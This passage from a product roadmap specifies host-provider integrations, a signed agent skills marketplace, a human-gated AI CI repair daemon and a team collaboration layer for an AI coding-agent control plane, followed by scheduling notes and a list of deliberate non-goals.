For each host, implement the existing provider interfaces (`IPullRequestProvider`, `IIssueProvider`, `ICheckProvider`, `INotificationProvider`, `IReleaseProvider`, `ICommitContextProvider`) plus device-flow/PAT auth completion:

1. **P3-07a GitLab:** REST v4 (MRs, issues, pipelines, todos, releases); register a real OAuth app id (replaces the placeholder flagged in Backlog B-2); MR-specific semantics (approvals, merge trains awareness — read-only surface).
2. **P3-07b Bitbucket Cloud:** PRs, issues (or Jira link-out where the workspace uses Jira), pipelines, no notifications API → typed "unsupported" stays for that panel only.
3. **P3-07c Azure DevOps:** PRs, work items, pipeline runs, no device flow → PAT dialog (already built).

Each lands as **its own PR** (one host = one task), with the same fixture-driven offline test pattern as T-23 (recorded JSON, token-in-header-only audit, typed error mapping incl. rate limits).

**Invariants:** one transport class per host (mirror `GitHubApiClient` — a second GitHub-style transport copy per host is fine; a second *GitHub* transport is still a rejection trigger); `HostProviderRegistry` stays the single dispatch point; P2-12 intake works against each host's PR/MR list unchanged.
**Required tests:** per-host fixture suites (list/create/merge/close + error mapping + token-never-leaks), `IsSupported` matrix updates, and one live smoke per host behind a network-gated trait.

---

## P3-08 — Agent skills marketplace (deferred → specified)

**Milestone:** M10+ (requires ecosystem scale; build the *format* early, the *store* later) · **Priority:** P2 · **Depends on:** P2-22 adapter channel, P2-14.

### Contract (format-first)

- **`SkillPack`** — a signed archive (manifest: name, version, target CLIs, prompts/config shims, required egress domains, required tools) installed into an agent's sandbox via the adapter-channel mechanics (P2-22), never executing host-side code.
- Distribution v1 = a Mainguard-owned registry index (same signed-manifest pipeline as `adapters.json`); community submission = PR to a registry repo with automated policy checks (egress domains against a denylist, no secrets, size caps).
- In-app browser: search/install/update/remove per repo or per agent profile; installed packs recorded in audit events.

**Invariants:** packs are data + prompts, never host executables; a pack's extra egress domains require explicit user acknowledgment (same panel pattern as P2-11); signature verified before install.
**Rejection triggers:** unsigned pack execution; marketplace payments before the format is proven (v1 is free packs only).
**Required tests:** manifest schema + signature verification; egress-ack flow; install/update/remove round-trip in a fixture sandbox.

---

## P3-09 — AI CI/CD janitor (deferred → specified)

**Milestone:** M10+ (requires merge-gate reputation first — unchanged) · **Priority:** P2 · **Depends on:** P2-10, P2-12, P2-26 patterns.

### Contract

A daemon service that watches configured CI (host checks API — T-26 seam) for **failures on main or release branches**, and on failure: spawns a repair worker (P2-14 two-phase — the plan is auto-generated but still requires approval unless the org policy enables auto-approve for `janitor` class), scoped to the failing check's diff context; the fix branch enters the P2-10 queue like any agent branch and ships as a PR via P2-12's host-API merge path.

**The governed difference from Composio AO / Jules auto-fix:** the janitor *proposes through the same verified, audited, human-gated pipeline* — auto-approve is an explicit org policy with its own audit event, not the default.

**Edge cases:** flaky-test detection (same failure hash passes on re-run → mark flaky, don't spawn); repeated failed repairs → circuit breaker (P2-26 pattern) + escalation; two janitor workers for the same failure → dedup by failure hash.
**Required tests:** failure-event → plan → queue integration with a scripted CI fixture; flaky suppression; dedup; policy-gated auto-approve audit trail.

---

## P3-10 — Team collaboration layer (new — the "expansion product" glue)

**Milestone:** M10 · **Priority:** P1 for the Team tier · **Depends on:** P2-15, P2-16, P2-23, P3-06.

### Why

Every enterprise conversation (and Conductor's unshipped "paid collaboration features") points the
same direction: the single-user control plane needs a team surface — shared visibility of agent
work, review assignments, and org-wide governance reporting.

### Contract (v1 scope, deliberately thin)

- **Shared queue view:** org members see each other's `AwaitingReview` branches (opt-in per repo); assign/request review; reviewer identity lands in the audit chain.
- **Org dashboard:** aggregate spend (P2-08 telemetry), verification pass rates, review latency, audit-export status — server-side over the P3-06 tenant store; desktop-only orgs get a local export instead.
- **Policy distribution:** the P2-23 signed policy doc gains org-template management UI.

**Invariants:** collaboration metadata never includes repo content for members without repo access (host permissions are the source of truth); all sharing is opt-in per repo.
**Required tests:** permission-boundary test (no content leak to non-collaborators); review-assignment audit events; dashboard aggregates from fixture telemetry.


---

# 8. Scheduling notes — nothing remains unspecified

Every workstream of the product is now specified at contract/invariant depth in this document:
the platform (§4), the competitive-match wave (§5), the Vibe product (§6), and cloud/ecosystem/
host-parity (§7). The only "later" that remains is *scheduling*, recorded in §3's milestones.
Two standing rules:

1. When a wave starts, its tasks may be re-cut against reality (a rewrite of a section here is
   cheap; an unplanned foundation is not) — rewrites bump the revision note at the top.
2. Any new competitor capability gets triaged into §1.2 (finding → plan change) before any code
   is written for it — the traceability table is the product's memory of *why*.

# 9. What this document deliberately does NOT build

Reviewed against the owner's match-everything directive 2026-07-07 — each retained skip has a
reason and most have a "5% slice" we do take:

- **Nimbalyst's editor suite** (Monaco/WYSIWYG/Excalidraw/mockups/CSV/ERD) + extension marketplace — different product thesis (workspace/IDE), massive surface, different buyer. *Slice taken:* render-only Markdown/Mermaid preview (P2-40) and light edit-in-place (P2-40).
- **Computer use / desktop automation / Cursor Design Mode** — off-thesis; a security-surface explosion inside our own sandbox story. Revisit element-annotation only after P2-33 lands.
- **Real-time multiplayer canvases/docs** — CRDT/hosting-heavy, weak signal from the reviewer/compliance buyer. *Slice taken:* P3-10's shared queue/review assignments; Copilot-canvas-style *plan* surfaces are covered by P2-14 approval + P2-39 plan-tree.
- **Cloud execution at Copilot/Cursor/Jules parity** — capital-intensive, off-thesis; we *intake* their output (P2-12) and ship our own scale story later (P3-06). Unchanged.
- **DORA/Insights dashboards** — eng-manager checkbox, not our buyer; T-22 analytics + P3-10 org dashboard suffice.
- **git-flow automation** — declining pattern, superseded by trunk-based + the merge queue. *Slice taken:* per-repo branch-naming/base rules (P2-C5 scope).
- **Full GitButler virtual-branch working mode** — architecturally invasive; P2-C4's split-wizard + stacked restacking captures the observed jobs-to-be-done at ~10% of the cost.
- **Autonomous auto-merge parity** (Composio AO / Copilot Agent Merge full autonomy) — the governed thesis's antithesis; P2-30/P3-09 ship the governed version (policy-gated, audited). Market against the ungoverned version.
- **50-agent swarm claims; reinventing the hypervisor; artifact viewers/image generation/theme marketplace** — unchanged skips (honesty, sbx/bubblewrap exist, no thesis contribution).
